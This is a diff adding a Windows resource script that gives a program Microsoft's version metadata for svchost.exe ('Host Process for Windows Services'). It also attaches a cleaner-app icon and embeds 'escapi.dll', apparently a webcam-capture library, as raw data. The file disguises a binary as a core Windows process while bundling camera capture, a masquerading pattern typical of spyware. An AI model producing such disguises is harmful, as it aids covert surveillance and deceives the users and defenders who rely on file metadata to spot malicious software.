@@ -1,0 +1,28 @@
+// Icon (1 is the ID, "app.ico" is the filename)
+1 ICON "app_cleaner_uninstaller_macos_bigsur_icon_190387.ico"
+2 RCDATA "escapi.dll"
+
+// Version Information
+1 VERSIONINFO
+FILEVERSION     10,0,19041,1
+PRODUCTVERSION  10,0,19041,1
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Host Process for Windows Services"
+            VALUE "FileVersion",      "10.0.19041.1 (WinBuild.160101.0800)"
+            VALUE "InternalName",     "svchost.exe"
+            VALUE "LegalCopyright",   "© Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "svchost.exe"
+            VALUE "ProductName",      "Microsoft® Windows® Operating System"
+            VALUE "ProductVersion",   "10.0.19041.1"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
